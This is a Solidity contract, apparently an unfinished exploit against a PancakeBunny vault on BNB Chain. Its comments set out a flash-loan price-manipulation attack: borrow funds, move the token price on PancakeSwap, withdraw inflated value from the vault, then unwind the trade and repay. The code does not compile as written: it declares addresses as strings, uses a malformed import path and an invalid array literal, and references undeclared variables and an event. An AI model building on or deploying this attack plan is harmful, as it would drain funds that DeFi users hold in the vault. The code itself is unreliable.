//SPDX-License-Identifier: Unlicense
pragma solidity =0.6.2;

import "../iceCream/interfaces/IFlashloanReceiver.sol";
import "../iceCream/interfaces/ICTokenFlashloan.sol";
import "../iceCream/interfaces/IVault.sol";
import "..uniswap/interfaces/IUniswapV2Router02.sol";

contract PancakeBunny is IFlashloanReceiver {
  address private constant CAKE_ROUTER_ADDRESS = "0x05fF2B0DB69458A0750badebc4f9e13aDd608C7F";
  address private constant WBNB_TOKEN_ADDRESS = "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c";
  //
  address private constant VAULT_ADDRESS = "0x31972E7bfAaeE72F2EB3a7F68Ff71D0C61162e81";
  // crETH
  address private constant FLASH_LOAN_ADDRESS = "0xb31f5d117541825D6692c10e4357008EDF3E2BCD";
  // BEP20 ETH
  // address private constant FLASH_LOAN_TOKEN_ADDRESS = "0x2170Ed0880ac9A755fd29B2688956BD959F933F8";
  // USDT
  address private constant FLASH_LOAN_TOKEN_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  // logic
  function go(uint tokenAmount) public {
    require(msg.sender == owner, "auth");
    // empty params for func call
    bytes memory params = [];
    ICTokenFlashloan(FLASH_LOAN_ADDRESS).flashLoan(address(this), tokenAmount, params);
  }

  // logic after receiving flash loan
  function executeOperation(address sender, address underlying, uint amount, uint fee, bytes calldata params) external {
    // step 1: take entire flashloan, use it to change the price of the deposited
    // token via pancakeswap
    // step 2: withdraw from vault, taking huge profits from pancakeswap price
    // manipulation
    // step 3: sell tokens acquired in step (2)
    // step 4: reverse step (1) by taking opposite trade, and return initial
    // loan + fee
    uint[] memory amounts = IUniswapV2Router02(router).swapExactTokensForTokens(loanAmount/2,uint(0), path, address(this), deadline);
    emit swapOtherTokenSwap(amounts[0],amounts[1]); 
  }
}
